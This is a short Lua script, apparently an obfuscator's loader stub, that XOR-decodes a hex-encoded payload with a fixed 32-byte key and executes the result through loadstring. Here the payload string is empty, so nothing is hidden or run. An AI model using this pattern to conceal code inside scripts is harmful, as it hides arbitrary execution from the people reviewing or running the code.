local k={132,157,57,106,55,183,206,99,52,122,252,225,215,80,82,117,218,131,241,1,205,128,134,187,19,184,183,132,234,186,139,40}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
